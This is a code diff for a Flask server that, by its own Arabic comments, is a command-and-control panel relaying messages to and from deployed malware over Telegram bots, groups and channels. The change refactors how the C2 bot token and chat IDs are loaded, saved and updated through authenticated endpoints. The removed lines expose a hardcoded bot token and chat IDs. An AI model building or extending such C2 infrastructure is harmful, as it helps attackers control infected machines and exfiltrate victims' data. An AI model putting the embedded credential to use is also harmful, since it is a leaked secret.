@@ -30,6 +30,7 @@ from modules.encryption import (
     aes_encrypt,
     aes_decrypt
 )
+from modules.c2_telegram_ids import resolve_c2_chats, DEFAULT_GROUP, DEFAULT_CHANNEL
 
 app = Flask(__name__)
 
@@ -273,9 +274,13 @@ _DEFAULT_CHATS    = ["7604675763", "-1002470378114", "-1002426552780"]
 
 TOKEN     = _DEFAULT_TOKEN
 ALL_CHATS = list(_DEFAULT_CHATS)
+C2_GROUP_ID = DEFAULT_GROUP
+C2_CHANNEL_ID = DEFAULT_CHANNEL
+C2_BOT_TOKEN = (_DEFAULT_TOKEN or "").strip()
 
 def _load_telegram_config():
-    global TOKEN, ALL_CHATS
+    global TOKEN, ALL_CHATS, C2_GROUP_ID, C2_CHANNEL_ID, C2_BOT_TOKEN
+    cfg: dict = {}
     if os.path.exists(TELEGRAM_CONFIG_PATH):
         try:
             with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
@@ -285,21 +290,30 @@ def _load_telegram_config():
             logger.info(f"✅ Telegram config loaded — chats: {ALL_CHATS}")
         except Exception as e:
             logger.error(f"Failed to load telegram config: {e}")
+    merged = {**cfg, "chat_ids": ALL_CHATS}
+    C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats(merged)
+    C2_BOT_TOKEN = (TOKEN or _DEFAULT_TOKEN).strip()
+    logger.info(f"📍 C2 Telegram — group: {C2_GROUP_ID}  channel: {C2_CHANNEL_ID}")
 
 def _save_telegram_config():
     try:
+        existing: dict = {}
+        if os.path.exists(TELEGRAM_CONFIG_PATH):
+            try:
+                with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
+                    existing = json.load(f)
+            except Exception:
+                existing = {}
+        existing['token'] = TOKEN
+        existing['chat_ids'] = ALL_CHATS
+        existing['c2_group_id'] = C2_GROUP_ID
+        existing['c2_channel_id'] = C2_CHANNEL_ID
         with open(TELEGRAM_CONFIG_PATH, 'w', encoding='utf-8') as f:
-            json.dump({'token': TOKEN, 'chat_ids': ALL_CHATS}, f, ensure_ascii=False, indent=2)
+            json.dump(existing, f, ensure_ascii=False, indent=2)
     except Exception as e:
         logger.error(f"Failed to save telegram config: {e}")
 
 _load_telegram_config()
-
-# ======================== إعدادات قناة C2 ↔ Malware (Telegram) ========================
-# هذا البوت مختلف عن بوت الإشعارات - هو المسؤول عن التواصل مع المالوير
-C2_BOT_TOKEN  = "8782474352:AAEK1FCeLrNMqnGXPLgLJfJQ1qmiHV9i9d4"
-C2_GROUP_ID   = "-1002470378114"    # يستقبل من المالوير
-C2_CHANNEL_ID = "-1002426552780"    # يرسل للمالوير
 
 # كلاينت متصلين عبر Telegram وجلساتهم بمفاتيح AES-GCM
 telegram_clients: set = set()
@@ -1147,28 +1161,48 @@ def get_telegram_config():
         "has_token": has_token,
         "masked_token": masked,
         "chat_ids": ALL_CHATS,
+        "c2_group_id": C2_GROUP_ID,
+        "c2_channel_id": C2_CHANNEL_ID,
     })
 
 @app.route("/update_telegram_settings", methods=["POST"])
 @rate_limit
 @require_auth
 def update_telegram_settings():
-    global TOKEN, ALL_CHATS
-    data = request.json
+    global TOKEN, ALL_CHATS, C2_GROUP_ID, C2_CHANNEL_ID, C2_BOT_TOKEN
+    data = request.json or {}
+    cfg = {}
+    if os.path.exists(TELEGRAM_CONFIG_PATH):
+        try:
+            with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception:
+            cfg = {}
     if "token" in data:
         TOKEN = data["token"]
     if "chat_ids" in data:
         ALL_CHATS = data["chat_ids"]
+    cfg["token"] = TOKEN
+    cfg["chat_ids"] = ALL_CHATS
+    if "c2_group_id" in data and data["c2_group_id"] is not None and str(data["c2_group_id"]).strip():
+        cfg["c2_group_id"] = str(data["c2_group_id"]).strip()
+    if "c2_channel_id" in data and data["c2_channel_id"] is not None and str(data["c2_channel_id"]).strip():
+        cfg["c2_channel_id"] = str(data["c2_channel_id"]).strip()
+    C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats(cfg)
+    C2_BOT_TOKEN = (TOKEN or _DEFAULT_TOKEN).strip()
     _save_telegram_config()
+    logger.info(f"📍 Telegram settings updated — group: {C2_GROUP_ID}  channel: {C2_CHANNEL_ID}")
     return jsonify({"status": "updated"})
 
 @app.route("/telegram_config", methods=["DELETE"])
 @rate_limit
 @require_auth
 def delete_telegram_config():
-    global TOKEN, ALL_CHATS
+    global TOKEN, ALL_CHATS, C2_GROUP_ID, C2_CHANNEL_ID, C2_BOT_TOKEN
     TOKEN     = ""
     ALL_CHATS = []
+    C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats({})
+    C2_BOT_TOKEN = (_DEFAULT_TOKEN or "").strip()
     _save_telegram_config()
     logger.info("🗑️ Telegram config cleared")
     return jsonify({"status": "deleted"})
